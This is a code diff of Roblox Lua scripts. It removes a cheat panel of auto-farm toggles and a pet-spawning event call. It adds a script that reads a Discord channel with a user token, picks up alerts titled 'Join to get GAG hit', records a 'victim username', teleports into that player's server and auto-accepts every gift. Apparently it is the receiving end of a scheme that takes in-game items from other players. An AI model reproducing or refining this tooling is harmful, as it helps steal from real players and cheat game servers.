@@ -1,123 +1,132 @@
-local player = game.Players.LocalPlayer
-local replicatedStorage = game:GetService('ReplicatedStorage')
-local workspace = game:GetService('Workspace')
-local runService = game:GetService('RunService')
+if not game:IsLoaded() then
+	game.Loaded:Wait() -- Wait for game to load
+end
 
--- GUI Elements
-local ScreenGui = Instance.new('ScreenGui')
-local MainFrame = Instance.new('Frame')
-local UIListLayout = Instance.new('UIListLayout')
+if token == "" or channelId == "" then
+    game.Players.LocalPlayer:kick("Add your token or channelId to use")
+end
 
-ScreenGui.Name = 'BGSI_Control_Panel'
-ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
+local bb = game:GetService("VirtualUser") -- Anti AFK
+game:service "Players".LocalPlayer.Idled:connect(function()
+    bb:CaptureController()
+    bb:ClickButton2(Vector2.new())
+end)
 
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-MainFrame.Size = UDim2.new(0, 200, 0, 400)
-MainFrame.Position = UDim2.new(0, 20, 0, 20)
-MainFrame.Visible = true
+local HttpServ = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local victimFile = isfile("user_gag.txt")
+local joinedFile = isfile("joined_ids.txt")
+if not victimFile then
+    writefile("user_gag.txt", "victim username")
+end
+if not joinedFile then
+    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
+end
+local victimUser = readfile("user_gag.txt")
+local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
+local didVictimLeave = false
+local timer = 0
 
-UIListLayout.Parent = MainFrame
-UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+local function saveJoinedId(messageId)
+    table.insert(joinedIds, messageId) -- Add the new ID
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
+end
 
-local toggles = {}
-
-function createToggle(name, callback)
-    local button = Instance.new('TextButton')
-    button.Parent = MainFrame
-    button.Size = UDim2.new(1, 0, 0, 30)
-    button.Text = name
-    button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.MouseButton1Click:Connect(function()
-        toggles[name] = not toggles[name]
-        button.BackgroundColor3 = toggles[name] and Color3.fromRGB(0, 170, 0) or Color3.fromRGB(170, 0, 0)
-        callback(toggles[name])
+local function waitForPlayerLeave()
+    local playerRemovedConnection
+    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+        if removedPlayer.Name == victimUser then
+            if playerRemovedConnection then
+                playerRemovedConnection:Disconnect()
+            end
+            didVictimLeave = true
+        end
     end)
 end
 
--- Toggle Functions
-createToggle('Auto Sell', function(state)
-    spawn(function()
-        while state do
-            wait(5)
-            replicatedStorage.Events.Sell:FireServer()
-        end
-    end)
-end)
+waitForPlayerLeave() -- Start listening for the victim leaving
 
-createToggle('Auto Equip Best Pets', function(state)
-    spawn(function()
-        while state do
-            wait(10)
-            replicatedStorage.Events.EquipBest:FireServer()
-        end
-    end)
-end)
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
 
-createToggle('Auto Use Golden Orbs', function(state)
-    spawn(function()
-        while state do
-            wait(1)
-            for _, orb in pairs(workspace.GoldenOrbs:GetChildren()) do
-                if orb:IsA('Part') and orb:FindFirstChild('TouchInterest') then
-                    firetouchinterest(player.Character.HumanoidRootPart, orb, 0)
-                    firetouchinterest(player.Character.HumanoidRootPart, orb, 1)
+-- Wait for game to fully load
+while plr:GetAttribute("DataFullyLoaded") ~= true do
+    plr:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
+end
+while plr:GetAttribute("Finished_Loading") ~= true do
+    plr:GetAttributeChangedSignal("Finished_Loading"):Wait()
+end
+while plr:GetAttribute("Loading_Screen_Finished") ~= true do
+    plr:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
+end
+
+wait(1)
+local giftNoti = plr:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
+
+local function acceptGifts()
+    while task.wait(0.1) do
+        for _, v in pairs(giftNoti:GetChildren()) do
+            if v:IsA("ImageLabel") then
+                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
+                replicatesignal(acceptImageButton.MouseButton1Click)
+            end
+        end
+    end
+end
+
+task.spawn(acceptGifts) -- Start accepting gifts
+
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
+
+local function increaseTimer()
+    while task.wait(1) do
+        timer = timer + 1
+    end
+end
+
+task.spawn(increaseTimer)
+
+local function autoJoin()
+    local response = request({
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+        Method = "GET",
+        Headers = {
+            ['Authorization'] = token,
+            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            ["Content-Type"] = "application/json"
+        }
+    })
+
+    if response.StatusCode == 200 then
+        local messages = HttpServ:JSONDecode(response.Body)
+        if #messages == 0 then
+            print("0 messages found")
+            return
+        end
+        for _, message in ipairs(messages) do
+            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
+                if message.embeds[1].title:find("Join to get GAG hit") then
+                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
+                    if placeId and jobId then
+                        local victimUsername = message.embeds[1].fields[1].value
+
+                        if didVictimLeave or timer > 10 then
+                            if not table.find(joinedIds, tostring(message.id)) then
+                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
+                                writefile("user_gag.txt", victimUsername)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
+                                return
+                            end
+                        end
+                    end
                 end
             end
         end
-    end)
-end)
-
-createToggle('Auto Use Mystery Boxes', function(state)
-    spawn(function()
-        while state do
-            wait(5)
-            replicatedStorage.Events.OpenMysteryBox:FireServer()
-        end
-    end)
-end)
-
-createToggle('Egg Lag', function(state)
-    spawn(function()
-        while state do
-            wait(2)
-            replicatedStorage.Events.ReduceEggLag:FireServer()
-        end
-    end)
-end)
-
-createToggle('Rift Luck Filter', function(state)
-    spawn(function()
-        while state do
-            wait(5)
-            replicatedStorage.Events.ApplyRiftLuck:FireServer()
-        end
-    end)
-end)
-
-createToggle('Auto Use Potions', function(state)
-    spawn(function()
-        while state do
-            wait(5)
-            replicatedStorage.Events.UsePotions:FireServer()
-        end
-    end)
-end)
-
-createToggle('Auto Mastery', function(state)
-    spawn(function()
-        while state do
-            wait(10)
-            replicatedStorage.Events.CompleteMastery:FireServer()
-        end
-    end)
-end)
-
--- Pet Spawner
-createToggle('Pet Spawner', function(state)
-    if state then
-        local petName = game:GetService('Players').LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('PetInputBox').Text
-        replicatedStorage.Events.SpawnPet:FireServer(petName)
+    else
+        print("Response code is not 200. Is your token and channelid correct?")
     end
-end)
+end
+
+while wait(5) do
+    autoJoin()
+end
